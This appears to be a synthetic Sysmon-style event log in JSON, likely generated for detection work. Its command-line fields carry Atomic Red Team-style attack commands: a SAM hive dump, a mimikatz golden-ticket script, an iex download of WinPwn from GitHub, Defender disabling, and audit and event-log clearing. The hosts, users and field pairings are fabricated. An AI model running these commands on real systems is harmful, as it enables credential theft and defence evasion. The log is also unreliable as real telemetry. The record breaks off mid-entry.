    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-50.smith-walker.info",
        "User": "kbriggs",
        "ProcessID": 6152,
        "ProcessName": "malware.exe",
        "CommandLine": "\"rm #{history_path}\\n\",",
        "LogonID": 490637,
        "LogonGuid": "41c01bd8-7f3d-45e4-9e58-16743229b5c9",
        "SourceProcessID": 5712,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\career..exe",
        "DestinationProcessID": 3128,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\couple..exe",
        "UtcTime": "2024-05-17T01:36:51.690257Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-69.chavez-miller.com",
        "User": "davidwoodward",
        "ProcessID": 7001,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \\nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\\nDisconnect-VIServer -Confirm:$false\\n\",",
        "LogonID": 403705,
        "LogonGuid": "27381afe-ba13-4a1a-9bf9-9fa89c19e8e4",
        "SourceProcessID": 5064,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\become..exe",
        "DestinationProcessID": 9424,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\you..exe",
        "UtcTime": "2024-05-17T01:36:51.690257Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-59.jones.biz",
        "User": "thomaspacheco",
        "ProcessID": 3261,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\\n\",",
        "LogonID": 472544,
        "LogonGuid": "3f385e16-5854-409c-b33d-bda991f40194",
        "SourceProcessID": 4636,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\about..exe",
        "DestinationProcessID": 7720,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\hour..dll",
        "UtcTime": "2024-05-17T01:36:51.690257Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-09.valentine.com",
        "User": "nataliemurray",
        "ProcessID": 1836,
        "ProcessName": "nc.exe",
        "CommandLine": "\"\\\"#{trufflesnout_path}\\\" forest -n #{domain}\\n\\\"#{trufflesnout_path}\\\" domain -n #{domain}\\n\",",
        "LogonID": 951939,
        "LogonGuid": "3e9388fe-a129-4ffe-ad84-97171b542cc7",
        "SourceProcessID": 9598,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\born..dll",
        "DestinationProcessID": 6040,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\above..dll",
        "UtcTime": "2024-05-17T01:36:51.691256Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-95.smith.com",
        "User": "nholt",
        "ProcessID": 5462,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\\\PhishingAttachment.xlsm\\n\",",
        "LogonID": 533522,
        "LogonGuid": "27bfea43-80ef-4559-8f45-fc9781129c61",
        "SourceProcessID": 7533,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\call..dll",
        "DestinationProcessID": 7969,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\letter..dll",
        "UtcTime": "2024-05-17T01:36:51.691256Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-19.tran.info",
        "User": "patricia36",
        "ProcessID": 9055,
        "ProcessName": "malware.exe",
        "CommandLine": "\"wmic.exe /Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\\\\\"ATOMICREDTEAM\\\\\\\"\\n\",",
        "LogonID": 554167,
        "LogonGuid": "24fc5cef-8d1e-4de9-ba87-86ff637dff3b",
        "SourceProcessID": 5355,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\record..exe",
        "DestinationProcessID": 7214,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\son..exe",
        "UtcTime": "2024-05-17T01:36:51.691256Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-56.stevens.com",
        "User": "daviddavis",
        "ProcessID": 8169,
        "ProcessName": "nc.exe",
        "CommandLine": "\"import -window root #{output_file}\\n\",",
        "LogonID": 548927,
        "LogonGuid": "ef9447e7-9846-47a3-9675-dcc538ae45a4",
        "SourceProcessID": 4014,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\explain..dll",
        "DestinationProcessID": 4294,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\line..dll",
        "UtcTime": "2024-05-17T01:36:51.691256Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-23.yoder-palmer.com",
        "User": "abigailcunningham",
        "ProcessID": 5649,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"%windir%\\\\system32\\\\inetsrv\\\\appcmd.exe install module /name:#{module_name} /image:#{dll_path}\\n\",",
        "LogonID": 334104,
        "LogonGuid": "348a0633-459e-481e-ab28-963b2c2686bb",
        "SourceProcessID": 3250,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\actually..dll",
        "DestinationProcessID": 8985,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\fear..dll",
        "UtcTime": "2024-05-17T01:36:51.692256Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-79.garcia.com",
        "User": "michaelbruce",
        "ProcessID": 5785,
        "ProcessName": "nc.exe",
        "CommandLine": "\"touch #{file_to_setuid}\\nchown root #{file_to_setuid}\\nchmod g+xs #{file_to_setuid}\\n\",",
        "LogonID": 832984,
        "LogonGuid": "707502dc-8feb-4cef-be0b-523a9485b055",
        "SourceProcessID": 8289,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\only..exe",
        "DestinationProcessID": 8720,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\effect..exe",
        "UtcTime": "2024-05-17T01:36:51.692256Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-73.harrell.com",
        "User": "samanthahansen",
        "ProcessID": 8208,
        "ProcessName": "malware.exe",
        "CommandLine": "\"mavinject.exe #{process_id} /INJECTRUNNING \\\"#{dll_payload}\\\"\\n\",",
        "LogonID": 765456,
        "LogonGuid": "3180b0f2-9d71-416c-9c0e-f2392c3daaf9",
        "SourceProcessID": 9835,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\newspaper..dll",
        "DestinationProcessID": 6811,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\difficult..exe",
        "UtcTime": "2024-05-17T01:36:51.692256Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-01.mcdaniel.net",
        "User": "isabella49",
        "ProcessID": 1316,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"reg save HKLM\\\\sam %temp%\\\\sam\\nreg save HKLM\\\\system %temp%\\\\system\\nreg save HKLM\\\\security %temp%\\\\security\\n\",",
        "LogonID": 761755,
        "LogonGuid": "7fa4abba-bd0e-489a-91d4-ee5d32f02ce4",
        "SourceProcessID": 1123,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\medical..exe",
        "DestinationProcessID": 9559,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\prove..exe",
        "UtcTime": "2024-05-17T01:36:51.692256Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-47.gonzalez.com",
        "User": "aimeedavis",
        "ProcessID": 5650,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"netstat\\nwho -a\\n\",",
        "LogonID": 647124,
        "LogonGuid": "16a3ac04-c779-4527-b2f4-a10dea5f4924",
        "SourceProcessID": 5201,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\especially..exe",
        "DestinationProcessID": 9792,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\police..exe",
        "UtcTime": "2024-05-17T01:36:51.693257Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-74.rivera.com",
        "User": "gentrysherri",
        "ProcessID": 7155,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\\n\",",
        "LogonID": 339596,
        "LogonGuid": "d05155b3-119e-4fd9-99bc-6b2856d4233d",
        "SourceProcessID": 4184,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\special..exe",
        "DestinationProcessID": 5698,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\form..dll",
        "UtcTime": "2024-05-17T01:36:51.693257Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-05.carter.com",
        "User": "kcalhoun",
        "ProcessID": 2748,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"nltest /domain_trusts\\nnltest /trusted_domains\\n\",",
        "LogonID": 687793,
        "LogonGuid": "ea725539-575e-42ae-a10d-625590ee0c36",
        "SourceProcessID": 9974,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\wall..dll",
        "DestinationProcessID": 5709,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\that..exe",
        "UtcTime": "2024-05-17T01:36:51.693257Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-65.mann.com",
        "User": "davidbell",
        "ProcessID": 5711,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\webcam\\\\NonPackaged\\\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\\nreg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\webcam\\\\NonPackaged\\\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\\n\",",
        "LogonID": 380923,
        "LogonGuid": "5782ed42-52e7-46dc-91ac-85470b3ca339",
        "SourceProcessID": 9952,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\total..exe",
        "DestinationProcessID": 9086,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\their..dll",
        "UtcTime": "2024-05-17T01:36:51.694256Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-02.ross.com",
        "User": "creynolds",
        "ProcessID": 7818,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\\n\",",
        "LogonID": 823595,
        "LogonGuid": "09bc011b-3d2e-426d-ba1f-41db95cb7bc0",
        "SourceProcessID": 1918,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\say..exe",
        "DestinationProcessID": 7115,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\skin..exe",
        "UtcTime": "2024-05-17T01:36:51.694256Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-58.thompson-green.biz",
        "User": "glennlucas",
        "ProcessID": 9367,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Remove-Item $env:TEMP\\\\golden.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\golden.txt -ErrorAction Ignore\\n\\n# get current domain SID if default was used\\n$domain_sid = \\\"#{domain_sid}\\\"\\nIf ($domain_sid -Match \\\"DEFAULT\\\") {\\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\\n}\\n\\n# create batch file with commands to run in a separate \\\"runas /netonly\\\" session\\n# so we don't purge Kerberos ticket from the current Windows session\\n# its output goes to golden.txt temp file, because we cannot capture \\\"runas /netonly\\\" output otherwise\\n@\\\"\\n>%TEMP%\\\\golden.txt 2>&1 (\\n  echo Purge existing tickets and create golden ticket:\\n  klist purge\\n  #{mimikatz_path} \\\"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\\\" \\\"exit\\\"\\n\\n  echo.\\n  echo Requesting SYSVOL:\\n  dir \\\\\\\\#{domain}\\\\SYSVOL\\n  \\n  echo.\\n  echo Tickets after requesting SYSVOL:\\n  klist\\n\\n  echo.\\n  echo End of Golden Ticket attack\\n)\\n\\\"@ -Replace \\\"DOMAIN_SID\\\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\\\golden.bat\\n\\n# run batch file in a new empty session (password and username do not matter)\\necho \\\"foo\\\" | runas /netonly /user:fake \\\"$env:TEMP\\\\golden.bat\\\" | Out-Null\\n\\n# wait until the output file has logged the entire attack\\ndo {\\n  Start-Sleep 1 # wait a bit so the output file has time to be created\\n  Get-Content -Path \\\"$env:TEMP\\\\golden.txt\\\" -Wait | ForEach-Object {\\n    if ($_ -match 'End of Golden Ticket attack') { break } \\n  }\\n} while ($false) # dummy loop so that 'break' can be used\\n\\n# show output from new empty session\\nGet-Content $env:TEMP\\\\golden.txt\\n\\n# cleanup temp files\\nRemove-Item $env:TEMP\\\\golden.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\golden.txt -ErrorAction Ignore\\n\",",
        "LogonID": 210273,
        "LogonGuid": "e1119d9c-11b3-4776-bbcb-2e34f9706a49",
        "SourceProcessID": 1852,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\window..dll",
        "DestinationProcessID": 7037,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\beat..exe",
        "UtcTime": "2024-05-17T01:36:51.694256Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-26.powell-thomas.info",
        "User": "kingkayla",
        "ProcessID": 4364,
        "ProcessName": "nc.exe",
        "CommandLine": "\"auditpol /clear /y\\nauditpol /remove /allusers\\n\",",
        "LogonID": 403618,
        "LogonGuid": "0a4d0af3-a5fe-4c2c-9305-3f255633ea44",
        "SourceProcessID": 2674,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\himself..exe",
        "DestinationProcessID": 4904,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\cut..exe",
        "UtcTime": "2024-05-17T01:36:51.694256Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-77.leonard.net",
        "User": "nathaniel72",
        "ProcessID": 7772,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nkittenz -consoleoutput -noninteractive\",",
        "LogonID": 462856,
        "LogonGuid": "9775976e-a9bc-4224-9ef6-3772f9fec1b6",
        "SourceProcessID": 9039,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\specific..exe",
        "DestinationProcessID": 2644,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\or..dll",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-48.williams-levy.com",
        "User": "emily81",
        "ProcessID": 2229,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"if (-not (Test-Path \\\"#{file_to_delete}\\\")) { New-Item \\\"#{file_to_delete}\\\" -Force }\\n& \\\"#{sdelete_exe}\\\" -accepteula \\\"#{file_to_delete}\\\"\\n\",",
        "LogonID": 629868,
        "LogonGuid": "e63a4035-e1d7-4b3e-8e96-f625ae0351cd",
        "SourceProcessID": 3527,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\similar..exe",
        "DestinationProcessID": 1593,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\answer..dll",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-79.rodriguez.com",
        "User": "edwardabbott",
        "ProcessID": 3712,
        "ProcessName": "malware.exe",
        "CommandLine": "\"gpresult /z\\n\",",
        "LogonID": 538795,
        "LogonGuid": "ebf70690-6cf6-4130-a9c3-a55f94a5f7eb",
        "SourceProcessID": 6569,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\represent..exe",
        "DestinationProcessID": 1071,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\compare..dll",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-84.collins-rodriguez.com",
        "User": "ericksonwayne",
        "ProcessID": 6454,
        "ProcessName": "nc.exe",
        "CommandLine": "\"New-Item -Path \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\\copy\\\" -ItemType Directory -ErrorAction Ignore\\nGet-ChildItem -Path \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\\copy\\\" -Recurse -Force -ErrorAction Ignore }\\nRemove-Item -Path \\\"C:\\\\Users\\\\$env:USERNAME\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\data\\\\copy\\\" -Recurse -Force -ErrorAction Ignore\\n\",",
        "LogonID": 847416,
        "LogonGuid": "6ed6fb16-41c4-47a5-8fce-86d8f4b3896d",
        "SourceProcessID": 2812,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\dog..dll",
        "DestinationProcessID": 4412,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\how..dll",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-87.mccoy-andrade.com",
        "User": "hernandezlaura",
        "ProcessID": 6626,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Set-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force\",",
        "LogonID": 358157,
        "LogonGuid": "0020912d-675c-495c-a7c1-91f0e673c297",
        "SourceProcessID": 2231,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\under..dll",
        "DestinationProcessID": 8715,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\management..exe",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-90.smith-hale.info",
        "User": "nicoleromero",
        "ProcessID": 1700,
        "ProcessName": "nc.exe",
        "CommandLine": "\"halt -p\\n\",",
        "LogonID": 876515,
        "LogonGuid": "6228ae03-077d-4a65-bcde-8e1effb41b09",
        "SourceProcessID": 8183,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\tell..dll",
        "DestinationProcessID": 2483,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\suffer..exe",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-96.moyer-grant.info",
        "User": "jamie53",
        "ProcessID": 7697,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"export HISTSIZE=0\\n#{evil_command}\\n\",",
        "LogonID": 394633,
        "LogonGuid": "a8cc6fd3-1990-40fa-9bdf-68f4d545efca",
        "SourceProcessID": 5315,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\new..dll",
        "DestinationProcessID": 7326,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\interest..dll",
        "UtcTime": "2024-05-17T01:36:51.695256Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-28.underwood.net",
        "User": "jamieperez",
        "ProcessID": 4073,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Get-CimInstance -Query \\\"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\\\"\\n\",",
        "LogonID": 337738,
        "LogonGuid": "a3c156ce-d61e-4278-864f-f0b3e357965a",
        "SourceProcessID": 6265,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\window..exe",
        "DestinationProcessID": 8613,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\all..exe",
        "UtcTime": "2024-05-17T01:36:51.696821Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-57.johnson.biz",
        "User": "damonestrada",
        "ProcessID": 3468,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$extList = #{extension_id}\\nforeach ($extension in $extList) {\\n  New-Item -Path HKLM:\\\\Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\\\\$extension -Force\\n  New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\\\\$extension\\\" -Name \\\"update_url\\\" -Value \\\"https://clients2.google.com/service/update2/crx\\\" -PropertyType \\\"String\\\" -Force}\\nStart chrome\\nStart-Sleep -Seconds 30\\nStop-Process -Name \\\"chrome\\\"\\n\",",
        "LogonID": 494699,
        "LogonGuid": "164cbe2c-9591-4762-af31-c7da78d61be4",
        "SourceProcessID": 9603,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\people..dll",
        "DestinationProcessID": 7132,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\professor..dll",
        "UtcTime": "2024-05-17T01:36:51.696821Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-13.smith.com",
        "User": "kathleenschroeder",
        "ProcessID": 8011,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"\\\"C:\\\\Program Files\\\\Windows Defender\\\\MpCmdRun.exe\\\" -RemoveDefinitions -All\\n\",",
        "LogonID": 472371,
        "LogonGuid": "5b568c18-e800-44cb-9f0b-f4d84cbae1cb",
        "SourceProcessID": 3260,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\style..dll",
        "DestinationProcessID": 7514,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\budget..dll",
        "UtcTime": "2024-05-17T01:36:51.696821Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-91.strickland-boyd.com",
        "User": "lindsay97",
        "ProcessID": 3674,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"echo \\\"\\\" | \\\"#{plink_file}\\\" \\\"#{vm_host}\\\" -ssh  -l \\\"#{vm_user}\\\" -pw \\\"#{vm_pass}\\\" -m \\\"#{cli_script}\\\"\\n\",",
        "LogonID": 109470,
        "LogonGuid": "abffda9f-5cf8-43c0-9fba-0a16a2899b36",
        "SourceProcessID": 8213,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\mean..dll",
        "DestinationProcessID": 6407,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\east..exe",
        "UtcTime": "2024-05-17T01:36:51.696821Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-51.hill-savage.com",
        "User": "obrown",
        "ProcessID": 6970,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$wdApp = New-Object -COMObject \\\"Word.Application\\\"\\nif(-not $wdApp.path.contains(\\\"Program Files (x86)\\\"))  \\n{\\n  Write-Host \\\"64-bit Office\\\"\\n  reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\\" /t REG_SZ /d \\\"PathToAtomicsFolder\\\\T1137.002\\\\bin\\\\officetest_x64.dll\\\" /f       \\n}\\nelse{\\n  Write-Host \\\"32-bit Office\\\"\\n  reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\\" /t REG_SZ /d \\\"PathToAtomicsFolder\\\\T1137.002\\\\bin\\\\officetest_x86.dll\\\" /f\\n}\\nStop-Process -Name \\\"WinWord\\\" \\nStart-Process \\\"WinWord\\\"\\n\",",
        "LogonID": 759221,
        "LogonGuid": "8340cba9-d0cf-4c5e-a8cb-9f711c26a6ca",
        "SourceProcessID": 8436,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\mention..exe",
        "DestinationProcessID": 7796,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\cultural..dll",
        "UtcTime": "2024-05-17T01:36:51.696821Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-86.collins.com",
        "User": "jessicabrown",
        "ProcessID": 6193,
        "ProcessName": "nc.exe",
        "CommandLine": "\"#{msi_exe} /q /#{action} \\\"#{msi_payload}\\\"\\n\",",
        "LogonID": 382690,
        "LogonGuid": "78a6b385-55a0-43ce-99ca-5f288de8ad04",
        "SourceProcessID": 4117,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\rich..dll",
        "DestinationProcessID": 1331,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\remember..dll",
        "UtcTime": "2024-05-17T01:36:51.697774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-71.walker.org",
        "User": "gandrews",
        "ProcessID": 8741,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wevtutil cl #{log_name}\\n\",",
        "LogonID": 538294,
        "LogonGuid": "7147f257-b3b3-4558-8f06-fe078852f761",
        "SourceProcessID": 8044,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\difficult..dll",
        "DestinationProcessID": 1640,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\leg..dll",
        "UtcTime": "2024-05-17T01:36:51.697774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-53.levy.biz",
        "User": "ksmith",
        "ProcessID": 5596,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}\",",
        "LogonID": 255918,
        "LogonGuid": "7003d1d8-cbd4-45d4-bb94-4fc62ef260c2",
        "SourceProcessID": 6761,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\main..exe",
        "DestinationProcessID": 3449,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\once..exe",
        "UtcTime": "2024-05-17T01:36:51.697774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-38.robinson.com",
        "User": "rbyrd",
        "ProcessID": 1872,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"cipher.exe /w:C:\\n\",",
        "LogonID": 322580,
        "LogonGuid": "c834f998-d48c-4868-a261-e55e23c6f769",
        "SourceProcessID": 2974,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\radio..dll",
        "DestinationProcessID": 7289,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\whom..dll",
        "UtcTime": "2024-05-17T01:36:51.697774Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-84.mullins.biz",
        "User": "john14",
        "ProcessID": 4037,
        "ProcessName": "explorer.exe",
